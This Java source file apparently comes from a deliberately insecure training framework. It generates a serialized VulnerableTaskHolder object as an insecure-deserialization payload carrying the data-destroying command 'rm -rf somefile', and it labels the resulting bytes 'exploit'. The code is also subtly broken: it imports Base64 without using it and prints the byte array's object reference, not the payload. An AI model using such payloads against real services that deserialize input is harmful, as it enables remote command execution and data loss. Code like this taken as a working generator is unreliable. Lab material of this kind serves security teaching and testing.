package org.dummy.insecure.framework;

import java.io.ByteArrayOutputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import org.dummy.insecure.framework.VulnerableTaskHolder;

public class Program{
	public static void main (String [] args) throws FileNotFoundException, IOException, ClassNotFoundException {
		VulnerableTaskHolder go = new VulnerableTaskHolder("delete all", "rm -rf somefile");
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(bos);
		oos.writeObject(go);
		oos.flush();
		byte[] exploit = bos.toByteArray();
		System.out.print(exploit);
	}
}